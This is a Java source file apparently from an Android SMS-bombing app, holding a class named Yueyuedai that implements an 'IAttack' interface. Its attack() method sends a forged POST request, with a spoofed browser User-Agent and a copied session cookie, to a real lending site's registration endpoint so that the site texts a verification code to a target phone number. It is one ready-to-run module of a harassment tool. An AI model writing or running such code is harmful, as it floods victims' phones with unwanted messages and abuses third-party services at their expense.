package com.example.wudi.sms.sites;

import android.util.Log;

import com.example.wudi.sms.MainApplication;
import com.example.wudi.sms.Utils;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * Created by wudi on 12/16/2015.
 */
public class Yueyuedai implements IAttack {
    @Override
    public void attack() {
        final MediaType text = MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8");

        OkHttpClient client = new OkHttpClient();
        client.setConnectTimeout(5000, TimeUnit.MILLISECONDS);
        client.setReadTimeout(5000, TimeUnit.MILLISECONDS);
        client.setWriteTimeout(5000, TimeUnit.MILLISECONDS);
        String postBody = "&oper=obtainPCode&type=SendRegSMS&phone=" + Utils.getNumber(MainApplication.context) + "&iscode=scjr";

        Request request = new Request.Builder()
                .url("http://www.yueyuedai.com/User/ajax.aspx")
                .post(RequestBody.create(text, postBody))
                .addHeader("Cookie", "Hm_lvt_8767b56e198f4a791a17af6eaa3b538c=1450267899; Hm_lpvt_8767b56e198f4a791a17af6eaa3b538c=1450267902; CNZZDATA5849410=cnzz_eid%3D1698403572-1450264610-http%253A%252F%252Fwww.rong360.com%252F%26ntime%3D1450264610; ASP.NET_SessionId=s21mahuc1e41k4w5sbqb0he1")
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586")
                .addHeader("Accept-Encoding", "gzip, deflate")
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
            }

            @Override
            public void onResponse(Response response) throws IOException {
                response.body().close();
            }
        });
    }
}
